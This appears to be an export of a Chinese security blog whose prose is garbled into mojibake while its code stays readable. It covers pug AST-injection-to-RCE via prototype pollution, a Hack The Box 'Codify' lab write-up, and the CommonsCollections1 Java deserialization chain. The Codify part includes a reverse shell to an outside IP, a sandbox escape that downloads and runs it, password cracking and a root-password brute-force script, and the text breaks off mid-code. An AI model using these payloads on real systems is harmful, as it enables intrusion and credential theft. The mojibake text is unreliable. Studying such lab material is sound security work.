æ¨¡ç‰ˆå¼•æ“çš„å·¥ä½œåŸç†æœ¬è´¨ä¸Šï¼Œå¼•æ“æ˜¯é€šè¿‡é’ˆå¯¹ä½ ä½¿ç”¨æ¨¡ç‰ˆè¯­è¨€ç¼–å†™çš„æ¨¡ç‰ˆè¿›è¡Œè§£æï¼Œä»è€Œç”Ÿæˆæ–°çš„JSä»£ç ã€‚å¤§é¢˜è¿‡ç¨‹å¯ä»¥æ¦‚æ‹¬å¦‚ä¸‹ï¼š 1è¯æ³•è§£æ -&gt; è¯­æ³•è§£æ -&gt; ä»£ç ç”Ÿæˆ ä½†æ˜¯åœ¨è¯­æ³•æ ‘å¤„ç†çš„è¿‡ç¨‹ä¸­ï¼Œåœ¨å¤„ç†èŠ‚ç‚¹çš„æ—¶å€™ï¼Œå­˜åœ¨å¤§é‡çš„èµ‹å€¼ã€å¾ªç¯æ“ä½œï¼Œè€Œåœ¨å¤§éƒ¨åˆ†æ¨¡ç‰ˆå¼•æ“ä¸­ï¼Œéƒ½æ˜¯è¿™ä¹ˆå†™çš„ï¼š 123456789attrs[name] = attrs[value] if(ast.block){}for(var i in node){} èµ‹å€¼æ“ä½œæœªåˆ¤æ–­å¯¹åº”çš„å±æ€§æ˜¯å¦ä¸ºå¯¹è±¡è‡ªèº«çš„å±æ€§ï¼Œå¯¼è‡´è®¿é—®åˆ°åŸå‹é“¾çš„ Object.prototype çš„å±æ€§ åˆ¤æ–­æŸä¸ªå±æ€§æ˜¯å¦å­˜åœ¨ï¼ŒåŒæ ·æœªåˆ¤æ–­æ˜¯å¦ä¸ºå¯¹è±¡è‡ªèº«å±æ€§æ˜¯å¦å­˜åœ¨ï¼Œè‹¥å­˜åœ¨åŸå‹é“¾æ±¡æŸ“ï¼Œåˆ™å¯ä»¥è¿›å…¥ifåˆ¤æ–­ JSçš„ forâ€¦in å¾ªç¯ä¼šéå†å¯¹è±¡çš„æ‰€æœ‰å¯æšä¸¾å±æ€§ï¼ŒåŒ…æ‹¬åŸå‹é“¾ä¸Šçš„å±æ€§ã€‚ä¾‹å¦‚ï¼š 12345let obj = { a: 1, b: 2 };obj.__proto__.c = 3;for (let i in obj) { console.log(i); // a, b, c} å› æ­¤è‹¥å­˜åœ¨åŸå‹é“¾æ±¡æŸ“ï¼Œåˆ™å¯ä»¥éšæ„ä¿®æ”¹ASTæ ‘ï¼Œè¿›è€Œå½±å“ç”Ÿæˆçš„ä»£ç ï¼Œæœ€ç»ˆè¾¾åˆ°RCEï¼ˆè¿œç¨‹ä»£ç æ‰§è¡Œï¼‰çš„ç›®çš„ éœ€è¦æ³¨æ„çš„æ˜¯ï¼š ASTæ ‘çš„ç”Ÿæˆæœ¬è´¨ä¸Šæ˜¯å½±å“ç”Ÿæˆçš„å­—ç¬¦ä¸²ï¼Œå› æ­¤ä¹Ÿå¯ä»¥å¯¼è‡´XSSæ¼æ´ ä»£ç æ‰§è¡Œçš„é‚£ä¸€æ­¥æ‰ä¼šå¯¼è‡´RCEï¼Œè¿™æ—¶å€™éœ€è¦ç¬¬ä¸€æ­¥é€šè¿‡åŸå‹é“¾æ±¡æŸ“æ³¨å…¥ä»£ç ï¼Œè¿›è€Œå½±å“ç”Ÿæˆçš„ä»£ç  pug template AST injection1234567891011const pug = require('pug');// æ¨¡æ‹ŸåŸå‹é“¾æ±¡æŸ“Object.prototype.block = {&quot;type&quot;:&quot;Text&quot;,&quot;val&quot;:`&lt;script&gt;alert(origin)&lt;/script&gt;`};const source = `h1= msg`;var fn = pug.compile(source, {});var html = fn({msg: 'It works'});console.log(html); // &lt;h1&gt;It works&lt;script&gt;alert(origin)&lt;/script&gt;&lt;/h1&gt; å½“æ‰§è¡Œåˆ° fn({msg: 'It works'}); è¿™ä¸€æ­¥çš„æ—¶å€™ï¼Œæœ¬è´¨ä¸Šæ˜¯è¿›å…¥äº†ä¸€æ®µå‡½æ•° æ‰“å°å‡ºè¿™æ®µå‡½æ•°çš„ä»£ç ï¼Œå¯ä»¥çœ‹åˆ°é€šè¿‡åŸå‹é“¾æ±¡æŸ“æˆ‘ä»¬å®ç°äº†å‘ç”Ÿæˆä»£ç ä¸­æ’å…¥ä¸€æ®µå­—ç¬¦ä¸² 12345678910111213141516(function anonymous(pug) {function template(locals) {var pug_html = &quot;&quot;, pug_mixins = {}, pug_interp;var pug_debug_filename, pug_debug_line;try {; var locals_for_with = (locals || {}); (function (msg) { ;pug_debug_line = 1;pug_html = pug_html + &quot; h1\\u003E&quot;;;pug_debug_line = 1;pug_html = pug_html + (pug.escape(null == (pug_interp = msg) ? &quot;&quot; : pug_interp)) + &quot; script\\u003Ealert(origin) \\u002Fscript\\u003E \\u002Fh1\\u003E&quot;; }.call(this, &quot;msg&quot; in locals_for_with ? locals_for_with.msg : typeof msg !== 'undefined' ? msg : undefined)); ;} catch (err) {pug.rethrow(err, pug_debug_filename, pug_debug_line);};return pug_html;}return template;}) åŸç†åˆ†æ(ä»¥pugä¸ºä¾‹)è¯­æ³•æ ‘ç»“æ„ pug è§£æ h1= msg ï¼Œç”Ÿæˆçš„è¯­æ³•æ ‘ç»“æ„ï¼š 1234567891011121314151617181920212223242526272829303132333435{ &quot;type&quot;:&quot;Block&quot;, &quot;nodes&quot;:[ { &quot;type&quot;:&quot;Tag&quot;, &quot;name&quot;:&quot;h1&quot;, &quot;selfClosing&quot;:false, &quot;block&quot;:{ &quot;type&quot;:&quot;Block&quot;, &quot;nodes&quot;:[ { &quot;type&quot;:&quot;Code&quot;, &quot;val&quot;:&quot;msg&quot;, &quot;buffer&quot;:true, &quot;mustEscape&quot;:true, &quot;isInline&quot;:true, &quot;line&quot;:1, &quot;column&quot;:3 } ], &quot;line&quot;:1 }, &quot;attrs&quot;:[ ], &quot;attributeBlocks&quot;:[ ], &quot;isInline&quot;:false, &quot;line&quot;:1, &quot;column&quot;:1 } ], &quot;line&quot;:0} è¯­æ³•æ ‘æ‰§è¡Œé¡ºåºä»¥åˆšåˆšç”Ÿæˆçš„è¯­æ³•æ ‘ç»“æ„ä¸¾ä¾‹ï¼Œè§£æé¡ºåºä¸ºï¼š Block Tag Block Code â€¦â€¦ æ³¨æ„ç¬¬4æ­¥è§£æ node.Type ä¸º Code ç±»å‹ï¼Œä¼šæ‰§è¡Œå¦‚ä¸‹ä»£ç ï¼š 12345case 'Code': case 'While': if (ast.block) { // æ³¨æ„è¿™é‡Œ ast.block = walkAST(ast.block, before, after, options); } åˆ¤æ–­ ast.block å±æ€§æ˜¯å¦å­˜åœ¨ï¼Œæ­¤å¤„çš„ ast å³å½“å‰astè¯­æ³•æ ‘çš„èŠ‚ç‚¹ å¦‚æœå­˜åœ¨ï¼Œç»§ç»­é€’å½’è§£æ block ç»“åˆåŸå‹é“¾æ±¡æŸ“å¦‚æœæŸå¤„å­˜åœ¨åŸå‹é“¾æ±¡æŸ“æ¼æ´ï¼Œä½¿å¾— 1Object.prototype.block = {&quot;type&quot;:&quot;Text&quot;,&quot;val&quot;:`&lt;script&gt;alert(origin)&lt;/script&gt;`}; é‚£ä¹ˆ ast.block å°±ä¼šè®¿é—®åˆ° ast.__proto__.block ï¼Œå³Object.prototype.block çš„å±æ€§ æ­¤æ—¶ä»£ç è¾“å‡ºç»“æœï¼Œå¯¼è‡´äº†XSS 12345678910const pug = require('pug');Object.prototype.block = {&quot;type&quot;:&quot;Text&quot;,&quot;val&quot;:`&lt;script&gt;alert(origin)&lt;/script&gt;`};const source = `h1= msg`;var fn = pug.compile(source, {});var html = fn({msg: 'It works'});console.log(html); // &lt;h1&gt;It works&lt;script&gt;alert(origin)&lt;/script&gt;&lt;/h1&gt; RCEæˆ‘ä»¬çŸ¥é“pugæœ¬è´¨ä¸Šæ˜¯å°†ä¸€æ®µä»£ç ï¼Œå¦‚ h1 =msg ç¼–è¯‘ä¸ºä¸€æ®µjsä»£ç ï¼ŒèƒŒåå…¶å®å°±æ˜¯ç”Ÿæˆè¯­æ³•æ ‘+ new Function å› æ­¤å¦‚æœèƒ½é€šè¿‡AST Injectionæ’å…¥èŠ‚ç‚¹ï¼Œå¹¶ä½¿ä¹‹æˆä¸ºä»£ç ï¼Œå³å¯è¾¾åˆ°è¿œç¨‹ä»£ç æ‰§è¡Œçš„ç›®çš„ã€‚ åˆšå¥½pugä¸­å°±æœ‰å¦‚ä¸‹ä»£ç ï¼š 12345678910// /node_modules/pug-code-gen/index.js if (debug &amp;&amp; node.debug !== false &amp;&amp; node.type !== 'Block') { if (node.line) { var js = ';pug_debug_line = ' + node.line; if (node.filename) js += ';pug_debug_filename = ' + stringify(node.filename); this.buf.push(js + ';'); } } é‚£ä¹ˆæˆ‘ä»¬é€šè¿‡ AST Injection + Prototype Pollution å³å¯å®ç°RCE 12345678910const pug = require('pug');Object.prototype.block = {&quot;type&quot;:&quot;Text&quot;,&quot;line&quot;:`console.log(process.mainModule.require('child_process').execSync('id').toString())`};const source = `h1= msg`;var fn = pug.compile(source, {});var html = fn({msg: 'It works'});console.log(html);","link":"/2023/11/18/Ast_Jnigection/"},{"title":"Codify(HTB)","text":"ä¿¡æ¯æœé›†12345sudo nmap -p- -sT --min-rate 3000 10.10.11.23922/tcp open ssh80/tcp open http3000/tcp open ppp è®¿é—®10.10.11.239 codify.htbæ·»åŠ åˆ°hosts,å‘ç°80ç«¯å£å’Œ3000ç«¯å£è®¿é—®é¡µé¢ä¸€æ ·çš„,è¿˜æœ‰ä¸€ä¸ªeditorè·¯ç”±; æ ¹æ®index.htmlï¼Œä¸éš¾çœ‹å‡ºåº”è¯¥æ˜¯nodejsçš„æ²™ç®±é€ƒé€¸ 123456789101112Test your Node.js code easily.This website allows you to test your Node.js code in a sandbox environment. Enter your code in the editor and see the output in real-time.Try it nowCodify is a simple web application that allows you to test your Node.js code easily. With Codify, you can write and run your code snippets in the browser without the need for any setup or installation.Whether you're a developer, a student, or just someone who wants to experiment with Node.js, Codify makes it easy for you to write and test your code without any hassle.Codify uses sandboxing technology to run your code. This means that your code is executed in a safe and secure environment, without any access to the underlying system. Therefore this has some limitations. We try our best to reduce these so that we can give you a better experience.So why wait? Start using Codify today and start writing and testing your Node.js code with ease! è®¿é—®editorè·¯ç”±;å­˜åœ¨è¿è¡Œnodejsä»£ç çš„åŠŸèƒ½ï¼ŒçŒœæµ‹å­˜åœ¨æ²™ç®±é€ƒé€¸ æ²™ç®±é€ƒé€¸åœ¨ç½‘ä¸Šèƒ½æ‰¾åˆ°ç›¸å…³pocï¼Œä½†æ˜¯ç›´æ¥ç”¨åå¼¹shellå‘½ä»¤ä¸€ç›´æŠ¥é”™ï¼Œæ¢ä¸€ç§æ–¹å¼ï¼› 1234567â”Œâ”€â”€(kaliã‰¿kali)-[~/æ¡Œé¢/Codify]â””â”€$ cat shell /bin/bash -i &gt;&amp; /dev/tcp/10.10.14.63/5555 0&gt;&amp;1 â”Œâ”€â”€(kaliã‰¿kali)-[~/æ¡Œé¢/Codify]â””â”€$ python3 -m http.server nodejsæ²™ç®±é€ƒé€¸è¿™å—ç¡®å®ä¸å¤ªæ‡‚ï¼Œä»¥ååº”è¯¥ä¼šå‡ºä¸€ç¯‡åšå®¢ï¼›pocå‚è€ƒè¿™ç¯‡åšå®¢clink me 123456789const vm = require('vm');const script = `const process = this.toString.constructor('return process')()process.mainModule.require('child_process').execSync('wget 10.10.14.63:8000/shell').toString()`;const sandbox = { m: 1, n: 2 };const context = new vm.createContext(sandbox);const res = vm.runInContext(script, context);console.log(res) 123456789const vm = require('vm');const script = `const process = this.toString.constructor('return process')()process.mainModule.require('child_process').execSync(&quot;/bin/bash -i shell&quot;).toString()`;const sandbox = { m: 1, n: 2 };const context = new vm.createContext(sandbox);const res = vm.runInContext(script, context);console.log(res) è¿æ¥åˆ°webshellä¹‹åï¼Œåœ¨/var/ww/concatä¸‹å‘ç°ä¸€ä¸ªdbæ–‡ä»¶ï¼Œå°è¯•ä»ä¸­å¾—åˆ°æ•æ„Ÿä¿¡æ¯ 12345678svc@codify:/var/www/contact$ pwd/var/www/contactsvc@codify:/var/www/contact$ lsindex.jspackage.jsonpackage-lock.jsontemplatestickets.db åœ¨tickets.dbæ•°æ®åº“ä¸­ä¹Ÿæ˜¯æˆåŠŸå‘ç°ä¸€ä¸ªè´¦å·å¯†ç  johnçˆ†ç ´å¯†ç ï¼Œåœ¨å°è¯•sshè¿æ¥ã€‚æ˜¯å¯ä»¥æˆåŠŸè¿æ¥çš„ 12john hash --wordlist=/usr/share/wordlists/rockyou.txtspongebob1 ææƒ12345678joshua@codify:~$ sudo -l[sudo] password for joshua: Matching Defaults entries for joshua on codify: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_ptyUser joshua may run the following commands on codify: (root) /opt/scripts/mysql-backup.sh æŸ¥çœ‹/opt/scripts/mysql-backup.shæ–‡ä»¶ï¼Œä¼¼ä¹æ˜¯ä¸€ä¸ªå¤‡ä»½æ•°æ®åº“çš„sh 1234567891011121314151617181920212223242526272829#!/bin/bashDB_USER=&quot;root&quot;DB_PASS=$(/usr/bin/cat /root/.creds)BACKUP_DIR=&quot;/var/backups/mysql&quot;read -s -p &quot;Enter MySQL password for $DB_USER: &quot; USER_PASS/usr/bin/echoif [[ $DB_PASS == $USER_PASS ]]; then /usr/bin/echo &quot;Password confirmed!&quot;else /usr/bin/echo &quot;Password confirmation failed!&quot; exit 1fi/usr/bin/mkdir -p &quot;$BACKUP_DIR&quot;databases=$(/usr/bin/mysql -u &quot;$DB_USER&quot; -h 0.0.0.0 -P 3306 -p&quot;$DB_PASS&quot; -e &quot;SHOW DATABASES;&quot; | /usr/bin/grep -Ev &quot;(Database|information_schema|performance_schema)&quot;)for db in $databases; do /usr/bin/echo &quot;Backing up database: $db&quot; /usr/bin/mysqldump --force -u &quot;$DB_USER&quot; -h 0.0.0.0 -P 3306 -p&quot;$DB_PASS&quot; &quot;$db&quot; | /usr/bin/gzip &gt; &quot;$BACKUP_DIR/$db.sql.gz&quot;done/usr/bin/echo &quot;All databases backed up successfully!&quot;/usr/bin/echo &quot;Changing the permissions&quot;/usr/bin/chown root:sys-adm &quot;$BACKUP_DIR&quot;/usr/bin/chmod 774 -R &quot;$BACKUP_DIR&quot;/usr/bin/echo 'Done!' é‡ç‚¹åœ¨è¿™ï¼Œåˆ¤æ–­è¾“å…¥çš„å¯†ç æ˜¯å¦äºrootå¯†ç ç›¸åŒï¼›==åˆ¤æ–­æ²¡æœ‰åŠ å¼•å·ï¼Œæ‰€ä»¥è¿™é‡Œå¹¶ä¸æ˜¯å­—ç¬¦ä¸²æ¯”è¾ƒï¼Œè¿™é‡Œå…è®¸é€šé…ç¬¦â€˜* çš„å­˜åœ¨çš„ï¼Œè¿™é‡Œçš„å¼±æ¯”è¾ƒâ€˜ == â€™å¯ä»¥ç”±æ­¤ç»•è¿‡, 123456if [[ $DB_PASS == $USER_PASS ]]; then /usr/bin/echo &quot;Password confirmed!&quot;else /usr/bin/echo &quot;Password confirmation failed!&quot; exit 1fi ç›´æ¥ç”¨pythonè„šæœ¬è·‘å‡ºrootçš„å¯†ç ï¼Œè¿™ä¸ªè„šæœ¬ä¹Ÿæ˜¯æ¯”è¾ƒå®¹æ˜“ç†è§£ 123456789101112131415import subprocessimport stringdef run_command(command): output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).stdout.decode() return outputdic=string.ascii_letters+string.digitspassword=&quot;&quot;for i in range(100): for i in dic: output= run_command(f'echo &quot;{password}{i}*&quot; | sudo /opt/scripts/mysql-backup.sh') if &quot;Password confirmed&quot; in output: password+=i print(password) break æ€»ç»“ä¿¡æ¯æœé›†åˆ°80.3000ç«¯å£å¼€æ”¾ï¼Œä¸”åŠŸèƒ½ä¸€æ ·ï¼›editorè·¯ç”±ä¸‹å­˜åœ¨æ²™ç®±é€ƒé€¸å¯ä»¥å®ç°ä»»æ„å‘½ä»¤æ‰§è¡Œï¼Œåå¼¹shellï¼Œå¾—åˆ°svcç”¨æˆ·ï¼Œç»§ç»­æœé›†åœ¨/var/ww/concat/tickets.dbæ–‡ä»¶ä¸­å¯ä»¥å¾—åˆ°ç”¨æˆ·åä¸ºjoshuaï¼Œç”¨johnçˆ†ç ´å¯†ç ï¼Œç”¨sshè¿æ¥ï¼›å‘ç°æœ‰(root) /opt/scripts/mysql-backup.shæ˜¯ä¸€ä¸ªå¤‡ä»½æ•°æ®åº“çš„shæ–‡ä»¶ï¼Œå…¶ä¸­å­˜åœ¨==åˆ¤æ–­æ²¡åŠ å¼•å·ï¼Œå…è®¸é€šé…ç¬¦â€˜* çš„å­˜åœ¨çš„ï¼›å†™pythonè„šæœ¬å¾—åˆ°rootå¯†ç ","link":"/2023/12/09/Codify(HTB)/"},{"title":"CommonsCollections1","text":"ç¯å¢ƒä»£å»ºå»å®˜ç½‘ä¸‹è½½ jdk8u65https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html ç„¶åå» ä¸‹è½½openjdkhttp://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/af660750b2f4/ å°†â€Java\\jdk1.8.0_65â€ä¸­çš„çš„src.zipè§£å‹åˆ°å½“å‰ç›®å½• æŠŠä¸‹è½½çš„openjdké‡Œ /share/classes/ é‡Œé¢çš„ sunåŒ… å¤åˆ¶åˆ° jdk1.8.0_65\\srcä¸­,å¹¶å°† jdk1.8.0_65\\srcè·¯å¾„æ·»åŠ åˆ°é¡¹ç›®çš„æºè·¯å¾„ ç„¶åâ€æ–‡ä»¶â€==&gt; â€œé¡¹ç›®ç»“æ„â€==&gt;â€SDKâ€==&gt;â€æºè·¯å¾„â€==&gt;â€æ·»åŠ â€==&gt;â€åº”ç”¨â€ ä»è¿™ä¸ªç½‘ç«™ä¸‹è½½commons-collections-3.2.1.jar https://nowjava.com/jar/detail/m02261229/commons-collections-3.2.1.jar.html ç„¶åâ€æ–‡ä»¶â€==&gt; â€œé¡¹ç›®ç»“æ„â€==&gt;â€åº“â€==&gt;â€æ·»åŠ â€==&gt;â€åº”ç”¨â€ CheckSetValueRuntimejavaä»»æ„æ‰§è¡Œå‘½ä»¤çš„ä»£ç  1Runtime.getRuntime().exec(&quot;calc&quot;); å°†Runtimeæ‰§è¡Œå‘½ä»¤çš„æ–¹å¼ä»¥åå°„çš„å½¢å¼å†™å‡º 1234Runtime r = Runtime.getRuntime();Class&lt;? extends Runtime&gt; clazz = r.getClass();Method exec = clazz.getMethod(&quot;exec&quot;, String.class);exec.invoke(r,&quot;calc&quot;); InvokerTransformerå†InvokerTransformerç±»ä¸­çš„transformè¿™æ ·ä¸€æ®µä»£ç éå¸¸å±é™©ï¼Œå®Œå…¨ç¬¦å’Œåå°„è°ƒç”¨ç±»çš„æˆå‘˜æ–¹æ³•çš„å½¢å¼ 12345678910public Object transform(Object input) { if (input == null) { return null; } try { Class cls = input.getClass(); Method method = cls.getMethod(iMethodName, iParamTypes); return method.invoke(input, iArgs); }catch {...} è€Œä¸”ä¸‰ä¸ªå‚æ•°å®Œå…¨å¯æ§ 123456public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) { super(); iMethodName = methodName; iParamTypes = paramTypes; iArgs = args;} å°è¯•å°†Runtimeåå°„çš„å½¢å¼æ”¹æˆinvokerTransformerè°ƒç”¨transformï¼Œä¹Ÿæ˜¯å¯ä»¥æ‰§è¡Œå‘½ä»¤çš„ 123Runtime r = Runtime.getRuntime();InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;calc&quot;});invokerTransformer.transform(r); æŒ‰ç…§Javaååºåˆ—åŒ–ä¸­æ‰¾POPé“¾çš„æ€è·¯ï¼Œæˆ‘ä»¬éœ€è¦å¯»æ‰¾å“ªé‡Œè°ƒç”¨transformæ–¹æ³•ï¼Œç„¶åå°è¯•â€ç§»èŠ±æ¥æœ¨â€; TransformedMapå…¶å®æœ‰å¾ˆå¤šåœ°æ–¹éƒ½æœ‰ç”¨åˆ°transformæ–¹æ³•ï¼Œä½†æ˜¯å¯ä»¥åˆ©ç”¨çš„æ–¹æ³•åœ¨TransformedMapä¸­çš„checkSetValue 123protected Object checkSetValue(Object value) { return valueTransformer.transform(value);} æˆ‘ä»¬å¯ä»¥çœ‹çœ‹TransformedMapç±» æ„é€ æ–¹æ³•çš„è®¿é—®ä¿®é¥°ç¬¦ä¸ºprotectedï¼ˆåªèƒ½åœ¨åŒåŒ…æˆ–è€…åˆ«çš„åŒ…çš„å­ç±»ï¼‰ 12345protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) { super(map); this.keyTransformer = keyTransformer; this.valueTransformer = valueTransformer;} æ­¤ç±»è¿˜æœ‰ä¸€ä¸ªpublicä¿®é¥°çš„é™æ€æ–¹æ³•decorateï¼Œè¿”å›ä¸€ä¸ªTransformedMapå¯¹è±¡ 123public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) { return new TransformedMap(map, keyTransformer, valueTransformer);} æ¥ä¸‹æ¥çœ‹çœ‹å“ªé‡Œè°ƒç”¨äº†checkSetValueæ–¹æ³•ï¼Œå…¶å®åªæœ‰ä¸€å¤„åœ°æ–¹è°ƒç”¨äº†ï¼› AbstractInputCheckedMapDecoratoræŠ½è±¡ç±»AbstractInputCheckedMapDecoratorçš„é™æ€å†…éƒ¨ç±»MapEntryçš„setValueæ–¹æ³•è°ƒç”¨äº† 123456789101112131415static class MapEntry extends AbstractMapEntryDecorator { /** The parent map */ private final AbstractInputCheckedMapDecorator parent; protected MapEntry(Map.Entry entry, AbstractInputCheckedMapDecorator parent) { super(entry); this.parent = parent; } public Object setValue(Object value) { value = parent.checkSetValue(value); return entry.setValue(value); }} ä¹Ÿæ˜¯åœ¨æŠ½è±¡ç±»AbstractInputCheckedMapDecoratorä¸‹çš„ä¸€ä¸ªé™æ€å†…éƒ¨ç±»EntrySetIteratorçš„nextæ–¹æ³•ï¼›è¿”å›äº†ä¸€ä¸ªMapEntryå¯¹è±¡ 1234public Object next() { Map.Entry entry = (Map.Entry) iterator.next(); return new MapEntry(entry, parent);} æ‰€ä»¥æˆ‘ä»¬å°†ä»£ç æ”¹æˆä¸‹é¢è¿™æ ·ä¹Ÿæ˜¯å¯ä»¥æ‰§è¡Œå‘½ä»¤çš„ï¼Œçœ‹ä¼¼æœ‰ç‚¹éº»çƒ¦ï¼Œä½†æ˜¯åŠ¨æ€è°ƒè¯•ä¸€ä¸‹å°±éå¸¸ç®€å• 12345678910Runtime r = Runtime.getRuntime();InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;calc&quot;});HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();hashMap.put(&quot;key&quot;,&quot;value&quot;);Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(hashMap, null, invokerTransformer);Set&lt;Map.Entry&lt;Object, Object&gt;&gt; entries = transformedMap.entrySet();Iterator&lt;Map.Entry&lt;Object, Object&gt;&gt; iterator = entries.iterator();Map.Entry&lt;Object, Object&gt; next = iterator.next();next.setValue(r); å…¶å®setValueæ˜¯ä¸€ä¸ªå¸¸ç”¨çš„æ–¹æ³•ï¼›ä¸»è¦ç”¨æ¥å¤„ç†åŒåˆ—é›†åˆçš„ï¼Œä¾‹å¦‚ï¼š 123456HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();hashMap.put(&quot;zzz&quot;,&quot;bbb&quot;);Set&lt;Map.Entry&lt;Object, Object&gt;&gt; entries = hashMap.entrySet();for (Map.Entry&lt;Object, Object&gt; entry : entries) { entry.setValue(&quot;ccc&quot;);} æˆ‘ä»¬ä¸å¦¨å°†ä»£ç æ”¹æˆä¸‹é¢ï¼Œä¹Ÿæ˜¯å¯ä»¥æ‰§è¡Œå‘½ä»¤çš„ï¼Œå¢å¼ºforçš„åº•å±‚è¿˜æ˜¯è°ƒç”¨äº†è¿­ä»£å™¨ï¼› 12345678Runtime r = Runtime.getRuntime();InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;calc&quot;});HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();hashMap.put(&quot;key&quot;,&quot;value&quot;);Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(hashMap, null, invokerTransformer);for (Map.Entry entry : transformedMap.entrySet()) { entry.setValue(r);} å¯ä»¥åŠ¨æ€è°ƒè¯•çœ‹çœ‹ å®é™…ä¸ŠAbstractInputCheckedMapDecoratoræ˜¯TransformedMapçš„çˆ¶ç±»ï¼›TransformedMapæ²¡æœ‰entrySet()æ–¹æ³•ï¼Œæ‰€ä»¥ä¼šå»ä»–çš„çˆ¶ç±»æ‰¾ï¼› å¹¶ä¸”èµ‹å€¼parentä¸ºTransformedMapå¯¹è±¡ å¢å¼ºforçš„åº•å±‚è¿˜æ˜¯è°ƒç”¨äº†è¿­ä»£å™¨ï¼›è¿”å›äº†ä¸€ä¸ªEntrySetIteratorå¯¹è±¡ï¼Œæ¥ä¸‹äº†å°±æ˜¯è°ƒç”¨hasNext()å’Œnext()æ–¹æ³• å¯ä»¥ç€é‡çœ‹ä¸€ä¸‹nextæ–¹æ³•ï¼›è¿”å›ä¸€ä¸ªMapEntryå¯¹è±¡ï¼Œ æœ€åè°ƒç”¨setValueæ–¹æ³• ç„¶åå°±ä¸€æ­¥ä¸€æ­¥è°ƒç”¨åˆ°invokerTransformerçš„transformæ–¹æ³• AnnotationInvocationHandleræœ€ç»ˆå‘ç°sun.reflect.annotation.AnnotationInvocationHandlerç±»ä¸‹ä¸­çš„readObjectæ–¹æ³•è°ƒç”¨äº†setValue ä¸‰ä¸ªé—®é¢˜ Runtimeæ˜¯æ²¡æœ‰å®ç°Serializableæ¥å£çš„ï¼Œæ— æ³•åºåˆ—åŒ– AnnotationInvocationHandlerä¸­çš„readObjectæ‰§è¡Œ memberValue.setValueéœ€è¦ç»•è¿‡ä¸¤ifåˆ¤æ–­ memberValue.setValueä¸­çš„å€¼æ— æ³•æ§åˆ¶ Serializableå…ˆæ¥è§£å†³ç¬¬ä¸€ä¸ªé—®é¢˜ è™½ç„¶Runtimeæ˜¯æ²¡æœ‰å®ç°Serializableæ¥å£çš„ï¼Œä½†æ˜¯Classå®ç°äº†Serializableæ¥å£ï¼› 1234Runtime r = Runtime.getRuntime();Class&lt;? extends Runtime&gt; clazz = r.getClass();Method exec = clazz.getMethod(&quot;exec&quot;, String.class);exec.invoke(r,&quot;calc&quot;); æ”¹æˆä¸‹é¢è¿™ç§å½¢å¼ 123456Class r = Runtime.class;Method getRuntime = r.getMethod(&quot;getRuntime&quot;, null);//æ³¨æ„&quot;getRuntime&quot;æ˜¯ä¸€ä¸ªé™æ€æ–¹æ³•ï¼Œobjå¯ä»¥ä¸ºnullObject runtime = getRuntime.invoke(null, null);Method exec = r.getMethod(&quot;exec&quot;, String.class);exec.invoke(runtime,&quot;calc&quot;); æ¥ç€æ”¹ 1234Class r = Runtime.class;Object getMethod = new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, null}).transform(r);Object invoke = new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}).transform(getMethod);new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;calc&quot;}).transform(invoke); æ”¹æˆè¿™æ ·ä¹Ÿæ˜¯å¯ä»¥æ‰§è¡Œå‘½ä»¤çš„ï¼›ä½†æ˜¯é—®é¢˜åˆæ¥äº†ï¼Œä¸Šé¢ä¸€å…±æ‰§è¡Œäº†ä¸‰æ¬¡transformæ–¹æ³•ã€‚ä½†æ˜¯InvokerTransformerç±»ä¸­åªèƒ½æ‰§è¡Œä¸€æ¬¡transformæ–¹æ³•ï¼› è¿™é‡Œåˆè¦ä»‹ç»ä¸€ä¸ªéœ€è¦åˆ©ç”¨çš„ç±»ChainedTransformer;å¯ä»¥çœ‹ä¸€ä¸‹æ­¤ç±»çš„æ„é€ æ–¹æ³•å’Œtransformæ–¹æ³• 12345678910111213//ä¼ é€’ä¸€ä¸ªtransformersæ–¹æ³•public ChainedTransformer(Transformer[] transformers) { super(); iTransformers = transformers;}//ä¸€ä¸ªforå¾ªç¯ï¼Œå°†ä¸Šä¸€ä¸ªå¯¹è±¡å½“ä½œä¸‹ä¸€ä¸ªå‡½æ•°æ‰§è¡Œï¼Œå¾ªç¯åµŒå¥—public Object transform(Object object) { for (int i = 0; i &lt; iTransformers.length; i++) { object = iTransformers[i].transform(object); } return object;} å› æ­¤æˆ‘ä»¬å¯ä»¥æ”¹æˆä¸‹é¢è¿™ç§å½¢å¼ï¼Œå®Œç¾è§£å†³ 12345678Transformer[] transformers = { new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, null}), new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;calc&quot;})};ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);chainedTransformer.transform(Runtime.class); ç»•è¿‡ifå†æ¥è§£å†³æ€ä¹ˆç»•è¿‡ä¸¤ifåˆ¤æ–­ 12345678910111213141516171819202122232425262728private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException { s.defaultReadObject(); AnnotationType annotationType = null; try { annotationType = AnnotationType.getInstance(type); } catch(IllegalArgumentException e) { throw new java.io.InvalidObjectException(&quot;Non-annotation type in annotation serial 